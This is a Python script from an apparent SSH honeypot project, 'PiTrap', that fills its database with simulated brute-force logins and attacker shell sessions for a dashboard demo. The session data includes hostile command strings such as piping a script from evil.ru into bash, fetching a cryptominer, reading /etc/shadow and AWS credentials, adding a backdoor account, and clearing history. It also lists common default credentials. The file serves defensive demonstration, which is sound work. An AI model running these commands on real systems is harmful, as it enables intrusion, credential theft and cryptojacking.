#!/usr/bin/env python3
"""
Simulate realistic attacks from diverse global IPs for demo purposes.
Directly inserts into database with real GeoIP enrichment.
"""

import sys
import os
import time
import random

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from storage.db import init_db, create_session_tables, insert_attempt, \
                       create_shell_session, log_shell_command, close_shell_session
from server.enricher import enrich

# Real IPs from known bot/scanner ranges around the world
ATTACK_IPS = [
    "185.220.101.45",   # Germany - Tor exit
    "45.33.32.156",     # USA - Linode
    "103.21.244.0",     # China
    "91.121.55.26",     # France - OVH
    "194.165.16.80",    # Russia
    "167.94.138.10",    # USA - Censys scanner
    "80.82.77.33",      # Netherlands
    "198.98.54.169",    # USA
    "193.32.162.157",   # Russia
    "45.141.84.90",     # Russia
    "159.89.49.140",    # Singapore - DigitalOcean
    "104.236.178.201",  # USA - DigitalOcean
    "188.166.26.65",    # Netherlands - DigitalOcean
    "103.253.145.20",   # Vietnam
    "200.234.182.87",   # Brazil
    "41.57.121.33",     # South Africa
    "58.218.200.228",   # China
    "218.92.0.56",      # China
    "116.31.116.53",    # China
    "222.186.42.157",   # China
]

CREDENTIALS = [
    ("root", "123456"), ("root", "password"), ("root", "admin"),
    ("root", "toor"), ("admin", "admin"), ("ubuntu", "ubuntu"),
    ("pi", "raspberry"), ("test", "test123"), ("user", "user"),
    ("deploy", "deploy"), ("git", "git123"), ("oracle", "oracle"),
    ("postgres", "postgres"), ("mysql", "mysql123"),
]

ATTACKER_TYPES = ["bot", "script_kiddie", "scanner", "targeted"]

ATTACK_SESSIONS = [
    {
        "type": "cryptominer",
        "commands": [
            ("whoami", "root", "T1033", "System Owner/User Discovery", 0),
            ("uname -a", "Linux ubuntu-prod-01 5.15.0-91-generic", "T1082", "System Information Discovery", 0),
            ("free -m", "Mem: 7982 1823 4901", None, None, 0),
            ("nproc", "4", None, None, 0),
            ("wget http://194.165.16.11/xmrig.sh", "xmrig.sh saved [4096]", "T1105", "Ingress Tool Transfer", 1),
            ("chmod +x xmrig.sh", "", "T1222", "File Permissions Modification", 0),
            ("./xmrig.sh --pool stratum+tcp://pool.minexmr.com:4444", "[Mining at 0.00 H/s]", "T1496", "Resource Hijacking", 1),
            ("crontab -e", "", "T1053", "Scheduled Task/Job", 1),
        ]
    },
    {
        "type": "data_thief",
        "commands": [
            ("whoami", "root", "T1033", "System Owner/User Discovery", 0),
            ("ls -la", "total 36\ndrwx------  5 root root", "T1083", "File and Directory Discovery", 0),
            ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash", "T1087", "Account Discovery", 0),
            ("cat /etc/shadow", "root:$6$xyz$fakehash:19000:0:99999:7:::", "T1068", "Exploitation for Privilege Escalation", 1),
            ("cat /root/.aws/credentials", "aws_access_key_id = AKIAIOSFODNN7EXAMPLE", "T1552", "Unsecured Credentials", 1),
            ("cat /var/www/html/wp-config.php", "$db_pass = 'Str0ngP@ssw0rd!';", "T1552", "Unsecured Credentials", 1),
            ("history -c", "", "T1070", "Indicator Removal", 1),
        ]
    },
    {
        "type": "lateral_mover",
        "commands": [
            ("whoami", "root", "T1033", "System Owner/User Discovery", 0),
            ("hostname", "ubuntu-prod-01", "T1082", "System Information Discovery", 0),
            ("cat /etc/hosts", "10.0.2.20 db-server\n10.0.2.30 backup-server", "T1049", "System Network Connections Discovery", 0),
            ("nmap 10.0.2.0/24", "Nmap scan report for 10.0.2.10", "T1046", "Network Service Discovery", 0),
            ("ssh ubuntu@10.0.2.20", "ssh: connect to host: Connection timed out", "T1021", "Remote Services", 1),
            ("ssh root@10.0.2.30", "ssh: connect to host: Connection timed out", "T1021", "Remote Services", 1),
        ]
    },
    {
        "type": "persistence",
        "commands": [
            ("whoami", "root", "T1033", "System Owner/User Discovery", 0),
            ("useradd -m backdoor", "Adding user 'backdoor'", "T1136", "Create Account", 1),
            ("echo 'backdoor:pass123' | chpasswd", "passwd: password updated", "T1136", "Create Account", 1),
            ("curl http://evil.ru/backdoor.sh | bash", "backdoor installed", "T1105", "Ingress Tool Transfer", 1),
            ("crontab -e", "", "T1053", "Scheduled Task/Job", 1),
            ("history -c", "", "T1070", "Indicator Removal", 1),
        ]
    },
    {
        "type": "recon",
        "commands": [
            ("whoami", "root", "T1033", "System Owner/User Discovery", 0),
            ("id", "uid=0(root) gid=0(root)", "T1033", "System Owner/User Discovery", 0),
            ("uname -a", "Linux ubuntu-prod-01 5.15.0-91-generic", "T1082", "System Information Discovery", 0),
            ("ps aux", "root 1 0.0 0.1 /sbin/init", "T1057", "Process Discovery", 0),
            ("netstat -an", "tcp 0.0.0.0:22 LISTEN", "T1049", "System Network Connections Discovery", 0),
            ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash", "T1087", "Account Discovery", 0),
            ("last", "root pts/0 10.0.0.1 Mon Mar 16", None, None, 0),
        ]
    }
]

def simulate_brute_force_attempts(ip, num_attempts=None):
    """Simulate brute force attempts from an IP."""
    if num_attempts is None:
        num_attempts = random.randint(3, 15)

    attempts = []
    for i in range(num_attempts):
        user, passwd = random.choice(CREDENTIALS)
        enriched = enrich(ip)
        attempt_id = insert_attempt({
            "source_ip": ip,
            "source_port": random.randint(40000, 65000),
            "username": user,
            "password": passwd,
            "client_version": random.choice([
                "SSH-2.0-libssh_0.9.6",
                "SSH-2.0-Go",
                "SSH-2.0-PUTTY_0.78",
                "SSH-2.0-paramiko_3.0",
                "SSH-2.0-OpenSSH_8.4",
            ]),
            "country": enriched["country"],
            "city": enriched["city"],
            "isp": enriched["isp"],
            "latitude": enriched["latitude"],
            "longitude": enriched["longitude"],
            "abuse_score": enriched["abuse_score"],
            "attacker_type": random.choice(ATTACKER_TYPES),
        })
        attempts.append(attempt_id)
        time.sleep(0.3)

    return attempts[-1] if attempts else None

def simulate_shell_session(ip, session_type, last_attempt_id):
    """Simulate a shell session with commands."""
    session_data = next(
        (s for s in ATTACK_SESSIONS if s["type"] == session_type),
        ATTACK_SESSIONS[0]
    )

    user, _ = random.choice(CREDENTIALS[:5])
    session_id = create_shell_session({
        "attempt_id": last_attempt_id,
        "source_ip": ip,
        "username": user
    })

    techniques = []
    malware_urls = []

    for command, response, tech_id, tech_name, flagged in session_data["commands"]:
        log_shell_command(
            session_id=session_id,
            command=command,
            response=response,
            technique_id=tech_id,
            technique_name=tech_name,
            flagged=flagged
        )
        if tech_id and tech_id not in techniques:
            techniques.append(tech_id)
        if "http" in command:
            import re
            urls = re.findall(r'https?://[^\s]+', command)
            malware_urls.extend(urls)
        time.sleep(0.2)

    risk = "critical" if any(t in techniques for t in ["T1496", "T1068", "T1552"]) else \
           "high" if any(t in techniques for t in ["T1105", "T1053", "T1136", "T1021", "T1070"]) else \
           "medium" if "T1059" in techniques else "low"

    close_shell_session(
        session_id=session_id,
        mitre_techniques=str(techniques),
        malware_urls=str(malware_urls),
        risk_level=risk
    )

    return techniques

def main():
    init_db()
    create_session_tables()

    print("=" * 60)
    print("PiTrap Attack Simulator")
    print("Generating diverse global attacks with real GeoIP...")
    print("=" * 60)

    session_types = ["cryptominer", "data_thief", "lateral_mover", "persistence", "recon"]

    for i, ip in enumerate(ATTACK_IPS):
        print(f"\n[{i+1}/{len(ATTACK_IPS)}] Simulating attack from {ip}...")

        # Brute force attempts
        last_id = simulate_brute_force_attempts(ip)
        print(f"  ✅ Brute force attempts logged")

        # Some IPs get shell sessions
        if i % 2 == 0 and last_id:
            session_type = session_types[i % len(session_types)]
            techniques = simulate_shell_session(ip, session_type, last_id)
            print(f"  ✅ Shell session: {session_type} → {techniques}")

        time.sleep(0.5)

    print("\n" + "=" * 60)
    print("✅ Simulation complete!")
    print("Open dashboard to see:")
    print("  - World map with attack pins from 15+ countries")
    print("  - Live feed with diverse attacker types")
    print("  - Shell sessions with full kill chains")
    print("=" * 60)

if __name__ == "__main__":
    main()
